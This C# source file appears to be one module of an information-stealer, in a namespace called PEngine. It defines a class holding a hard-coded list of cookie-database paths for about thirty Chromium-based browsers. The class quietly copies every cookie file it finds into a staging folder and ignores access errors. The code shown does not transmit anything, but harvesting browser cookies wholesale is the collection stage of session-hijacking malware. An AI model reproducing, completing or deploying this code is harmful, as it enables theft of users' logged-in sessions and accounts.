namespace PEngine.Engine.Browsers.Chromium.Cookies
{
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Security;

    public class ChromeCookiesSearcher
    {
        public static List<string> GetCookies = new List<string>();

        private static readonly List<string> CookiesFullPath = new List<string>
        {
           CombineEx.Combination(GlobalPath.AppData, @"Opera Software\Opera Stable\Cookies"),
           CombineEx.Combination(GlobalPath.AppData, @"Opera Software\Opera Developer\Cookies"),
           CombineEx.Combination(GlobalPath.AppData, @"Avant Profiles\.default\webkit\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Yandex\YandexBrowser\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Google\Chrome\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Comodo\Dragon\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Opera Software\Opera Neon\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Orbitum\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Torch\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Kometa\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Amigo\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Kinza\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"BraveSoftware\Brave-Browser\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"360Browser\Browser\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"7Star\7Star\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Chromium\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Iridium\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"MapleStudio\ChromePlus\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Nichrome\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Vivaldi\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Epic Privacy Browser\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"CatalinaGroup\Citrio\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"CocCoc\Browser\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Sputnik\Sputnik\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"uCozMedia\Uran\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"CentBrowser\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Elements Browser\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Superbird\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Chedot\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Suhba\User Data\Default\Cookies"),
           CombineEx.Combination(GlobalPath.LocalAppData, @"Rafotech\Mustang\User Data\Default\Cookies")
        };

        private static void GetSecureFile(string PathLogins, string Pattern, SearchOption SO = SearchOption.TopDirectoryOnly)
        {
            try
            {
                foreach (string Mic in Directory.EnumerateFiles(PathLogins, Pattern, SO))
                {
                    if (!File.Exists(Mic))
                    {
                        continue;
                    }
                    else
                    {
                        GetCookies.Add(Mic);
                    }
                }
            }
            catch (UnauthorizedAccessException) { }
            catch (IOException) { }
            catch (SecurityException) { }
        }

        public static void CopyCookiesInSafeDir(string DirCookies, bool Recursive = true)
        {
            CombineEx.CreateDir(DirCookies);
            foreach (string Cookie in CookiesFullPath)
            {
                if (!File.Exists(Cookie))
                {
                    continue;
                }
                else
                {
                    try
                    {
                        CombineEx.FileCopy(Cookie, CombineEx.Combination(DirCookies, Path.GetFileName(GetApplication.GetBrowserName(Cookie))), Recursive);
                        GetSecureFile(DirCookies, GetApplication.GetBrowserName(Cookie));
                    }
                    catch (ArgumentException) { }
                }
            }
        }
    }
}